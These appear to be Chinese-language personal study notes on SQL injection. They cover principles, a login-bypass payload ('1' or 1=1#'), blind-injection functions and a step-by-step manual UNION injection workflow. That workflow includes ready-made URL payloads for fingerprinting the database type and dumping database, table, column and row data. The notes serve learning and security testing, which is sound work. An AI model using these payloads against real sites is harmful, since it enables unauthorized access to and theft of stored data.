```
SQL注入原理：
	1、参数用户可控
	2、服务器对参数没有过滤或者过滤不严谨
	
	前端用户输入用来查询数据库的一个sql语句，id=1,服务器需要对该id进行过滤，然后拼接sql语句
	select * from user where id=1;
	id=1 or 1=1
	select * from user where id=1 or 1=1页面会显示正常
	
	select * from user where id='$_POST["id"]';
危害：
	读取数据库的数据
	修改或者删除数据
	往服务器读写文件
	getshell
	
	万能密码原理
	select * from admin where username='user' and password='pass'
	用户名： 1' or 1=1#
	密码：123
	select * from admin where username='1' or 1=1#' and password='123'
	select * from admin where username='1' or 'a'='a'# and password='123'
	
sql注入
	请求方式：GET方式，POST方式
	根据sql注入点的参数类型分类：整数型注入、字符型注入、搜索型注入
	根据反馈类型：报错注入、联合注入、布尔注入、时间注入
	根据数据库类型：MSSQL MYSQL ORACLE ACCESS NOSQL等
	
手工注入
	常用函数：user() version() database() concat() group_concat() concat_ws()
	分割字符串mid()  mysql
			substr()  oracle、mysql、sqlserver
			substring() mysql、sqlserver
			left()  从左截取
			right() 从右截取
	条件判断
    		if(判断的条件，条件为帧返回值，条件为假返回值)
			select if("1=1",'true','false');
			select if(ascii(substr(database(),1,1))>92,"true","false");
			select if(ascii(substr(database(),1,1))=ascii('r'),"true","false");
			   （database(),1,1)   起始位置1，截取长度
				substr 截取字符串
				ascii
			case when 判断条件 then 条件为真返回值 else 条件为假返回值 end
			select case when 1=1 then "right" else "wrong" end;
			select case when ascii(substr(database(),1,1))>92 then "right" else "wrong" 			end;
	数据库注释：#（%23  url编码） -- +（注释掉后面）
	连接符号+
		length(字符串) 计算字符串长度
		select length(user());
	
	
union 联合查询
	select name,pass,gender from users where uid=1 union select 1,2,3//前后字段要求一 致
	可以根据union 判断当前的sql选择的字段数，可以在显错注入中，判断哪个字段在前端显示
	order by n //对第n个字段进行排序,如n超过表的列数，报错。 可以根据order by判断数据库表有几列
	
	mysql 数据库特性
	mysql 5.0上下区别：
		1、5.0以上支持information_schema 
		自带，系统库，汇总（其他数据库名，表名，字段名）存在于information_schema的columns中
		需要关注columns三个字段  table_schema库名 table_name表名 column_name字段名
		select distinct table_schema from information_schema.columns//库名distinct去重
		select distinct table_name from information_schema.columns  //表名
	    select table_name from information_schema.columns where table_schema='x'所有表
		
		select distinct column_name from information_schema.columns where 					table_schema='dvwa' and table_name='user'; 获取dvwa下user表的字段
		注意：可以根据需求将数据库名和表名转换成16进制
		
		手工注入：
			1、判断是否有注入（判断从后台数据库中选取的列数，判断哪几列在前端显示）
			2、收集数据库信息（用户名、版本、当前数据库名）
			3、获取当前数据库下的所有表名
			4、获取当前数据库下指定表中的字段名
			5、获取字段对应的数据
			6、破解数据、登录系统，getshell,提权
	
		案例分析
		1、找url,判断注入点
		url:id=1   inurl:id=
		判断方式
		'  /and sleep(5)   and '1'='1 '1'='2 /' and or 
		根据页面显示效果或者提示信息来判断用户提交的数据是否在数据库中被执行
		2、判断数据库类型
			常见架构
			php+mysql
			jsp/asp+mssql
            jsp/asp+access
            jsp+oracle
		 
		 	函数
		 	http://target.com?id=1 and user>0 (mssql正常执行)
		 	http://target.com?id=2 and version()>0 (mysql正常执行)
		 	
		 	报错信息来判断数据库类型
		 	http://target.com?id=1 and (select count(*) from sysobjects)>0 sqlserver
		 	http://target.com?id=1 and (select count(*) from myobjects)>0  oracle
		 	http://target.com?id=1 and (select count(*) from   			 						information_schema.columns)>0     mysql
		 	
		确定列数和位置	
		 	http://target.com?id=1 order by 10 判断列数
		 	http://target.com?id=1 union select 1,2,3,4,5 
		 	如果不回显，让第一个select变为假 如id=-1   !!!!!!
		 	http://target.com?id=-1 union select 1,2,3,4,5  
		 	
		收集信息
			所有数据库
			http://192.168.91.131/jdy/typeid.php?typeid=-1 union select 1,(select group_concat(distinct table_schema) from information_schema.columns),3,4,5
			
			group_concat将多个字符串合并成一个字符串		
			
			当前数据库
			http://target.com?id=-1 union select 1,(database()),3,4,5
			数据库版本
			http://target.com?id=-1 union select 1,(version()),3,4,5
			用户
			http://target.com?id=-1 union select 1,user(),3,4,5
			临时文件夹
			http://target.com?id=-1 union select 1,(@@tmpdir),3,4,5
			数据库文件所在位置
			http://target.com?id=-1 union select 1,(@@datadir),3,4,5
		 	
		获取当前数据库下表名 	
		 	http://target.com?id=-1 union select 1,(select group_concat(distinct 				table_name) from information_schema.columns where 									table_schema=database()),3,4,5
		 	
		 	http://target.com?id=-1 union select 1,(select group_concat(distinct 				table_name) from information_schema.columns where table_schema=十六进制的数据			  库名 0x开头)),3,4,5
		 	
		获取当前数据库下指定表字段			 	
		 	http://target.com?id=-1 union (select group_concat(distinct column_name) from information_schema.columns where table_schema=database() and table_name=十六进制的表名 0x开头)3,4,5		 	
		 	
		 获取字段的数据
         http://target.com?id=-1 union select 1,(select concat_ws(列1，列2) from 表名 limit 0,1)3,4,5 
		 
		 concat_ws   参数之间的分隔符 由于返回是多个值，所以需要进行limit
		 	
		 	
SQL注入代码审计：		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
		 	
	
	
	
	
	
	
	
	
```

